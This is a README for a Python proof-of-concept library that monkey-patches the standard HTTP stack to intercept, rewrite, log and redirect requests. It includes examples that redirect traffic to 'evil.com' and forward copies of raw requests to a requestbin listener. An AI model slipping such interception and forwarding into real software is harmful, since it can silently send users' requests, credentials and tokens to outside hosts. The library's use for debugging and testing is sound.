# py-request-interceptor
[![Python3 Version](https://img.shields.io/badge/python-3.6%20%28%3F%29%20%7C%203.7%2B-blue)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-GPL--3.0-blue)](/LICENSE)
[![Code Style](https://img.shields.io/badge/code%20style-black-000000)](https://github.com/psf/black)  
## Description
:rat: Intercepts your HTTP(S) requests from Python standard libraries. Allows you to catch API calls and HTTP(S) requests from different `requests`/`urllib`/`http`-based libraries (and many others based on the original `http.client`/`socket` stack).

## Warning
:construction: **Note:** This is just a WIP/PoC project w/o rocket science in it - just a bunch of dirty monkey patches. So, enjoy it "as is" if you are interested in it. Not properly tested lol.

## Proof of Concept
```python3
from src.interceptor import Interceptor

# Initialize 'Interceptor' here, nothing special
intercept = Interceptor()

@intercept.sniff(listener="http://YOUR_LISTENER_ENDPOINT")
@intercept.dump()
@intercept.data(data="GET / HTTP/1.1\r\n ...modified request goes here")
def example_sniff_connect() -> CaseInsensitiveDict:
    """
    Patch request data, dump modified request to the logs, and re-send copy of the request
    to another endpoint
    :return: response headers
    """
    return get(url="http://ORIGINAL_HOST").headers

example_sniff_connect()
```

## Handlers
### Redirect to another target
Definition:  
```python3
def target(self, host: str, port: int) -> callable:
```
Example:
```python3
intercept = Interceptor()

@intercept.target(host="http://evil.com", port=80)
def my_func():
    ...
```
### Replace raw requests data
Definition:  
```python3
def data(self, data: Union[str, bytes]) -> callable:
```
Example:
```python3
intercept = Interceptor()

@intercept.data(data="GET / HTTP/1.1\r\n...")
def my_func():
    ...
```
### Log raw requests to the console 
Definition:  
```python3
def dump(self) -> callable:
```
Example:
```python3
intercept = Interceptor()

@intercept.dump()
def my_func():
    ...
```
### Re-send copy of the original raw requests to another endpoint
Definition:  
```python3
def sniff(self, listener: str) -> callable:
```
Example:
```python3
intercept = Interceptor()

@intercept.sniff(listener="http://requestbin.net/r/YOUR_REQUESTBIN_ID")
def my_func():
    ...
```
